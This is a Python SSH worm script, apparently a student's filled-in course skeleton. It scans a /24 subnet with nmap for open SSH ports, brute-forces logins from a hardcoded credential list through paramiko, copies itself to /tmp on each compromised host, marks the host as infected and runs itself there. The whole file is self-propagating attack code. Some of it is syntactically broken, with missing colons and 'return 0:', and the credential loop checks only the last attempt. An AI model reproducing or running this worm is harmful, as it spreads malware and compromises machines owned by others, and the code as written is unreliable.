#!/usr/bin/python
import paramiko
import sys
import socket
import nmap
import netinfo
import os
import logging
import os.path

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


### ---[[ Delete Worm Dependencies]]-- ###

def spreadAndExecuteArgs(ssHInfo)
        if (sys.argv[0] == "destroy") :
                spreadAndExecute(ssHInfo, true)
                removeWormRec()
        else:
                spreadAndExecute(ssHInfo, false)
        return 0:

def removeWormRec()
        os.remove("/tmp/infected.txt")
        os.remove("/tmp/worm.py")
        return 0:

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(sftp,remote,local):
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).

	
	try:
		sftp.stat('/tmp/infected.txt')
		print 'its not stat'
		sftp.get(remote, local)
		print 'Its not get'
		print "This system is already infected"
		return True
	except IOError:
		print "This system is not infected"
		return False
	except FileNotFoundError:
		print "File Not Found- System not infected"
		return False

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient, Destroy):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/" + "worm.py")
	if (Destroy):
             sshClient.exec_command("chmod a+x /tmp/worm.py -destroy")
             return 0
	sshClient.exec_command("chmod a+x /tmp/worm.py")

def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.8/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(Host, userName, passWord, sshClient):
		
	try:
		sshClient.connect(Host, username = userName, password = passWord, port = 22)
		shell = sshClient.get_transport().open_session()
		print('{0}, {1}, authentication complete'.format(userName, passWord))
		return 0
	except paramiko.AuthenticationException:
		print('{0}, {1}, authentication failed'.format(userName,passWord))
		return 1
	except paramiko.SSHException:
		print ('SSH not running properly')
		return 3
		
		
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = []
				
	# Go through the credentials

	for (username, password) in credList:
		getValue = tryCredentials(host, username, password, ssh)
		
	if(getValue == 0):
		print('Connection was a success')
		attemptResults.append('Success')
		return ssh
	elif(getValue == 1):
		print('Connection Failed')
		attemptResults.append('Failure')
		return None

	elif(getValue == 3):
		print('SSH fault')
		return None
	
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
			
	# Could not find working credentials

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	return netinfo.get_ip(interface)

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################


	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
 
#Start Point

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 

def cleaner(sshClient):
	pass
#if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	#pass
# TODO: Get the IP of the current system


# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

getHost = getMyIP('enp0s3') 
networkHosts.remove(getHost)
print(networkHosts, '\n Testing')

 
# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print ('SSH info: ', sshInfo)
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		fileOUT = open('/tmp/infected.txt', 'w+')
		fileOUT.write("You've been infected!!!\nZombie STYLE")
		fileOUT.close()
		
		
		
	#	if(os.path.exists(sshInfo.exec_command('ls -l /tmp/test'))):
	#		print 'It exists'
	#	else:
	#		print 'It does not exist'
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		
				#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
        	remotepath = '/tmp/infected.txt'
		localpath = '/tmp/infected.txt'
		sftp = sshInfo.open_sftp()
		
		if not (isInfectedSystem(sftp, remotepath, localpath)):
			spreadAndExecuteArgs(sshInfo)
			std_in, std_out, std_err =sshInfo.exec_command("python '/tmp/worm.py'")
			print(std_out.read())
			
		else:
			print('All systems clear?')
			sys.exit()


		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
		
		#print "Spreading complete"	
		
